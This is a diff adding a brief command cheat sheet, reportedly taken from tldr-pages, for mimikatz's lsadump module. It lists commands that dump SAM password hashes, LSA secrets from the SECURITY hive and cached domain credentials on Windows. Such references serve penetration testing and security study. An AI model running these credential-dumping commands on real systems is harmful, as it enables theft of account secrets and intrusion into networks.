@@ -1,0 +1,13 @@
+; This has been extracted from
+; https://github.com/tldr-pages/tldr/blob/master/pages/windows/mimikatz-lsadump.md
+
+% mimikatz-lsadump, windows
+
+# Dump SAM hashes
+mimikatz "lsadump::sam"
+
+# Dump secrets from the SECURITY hive
+mimikatz "lsadump::secrets"
+
+# Dump cached domain credentials
+mimikatz "lsadump::cache"
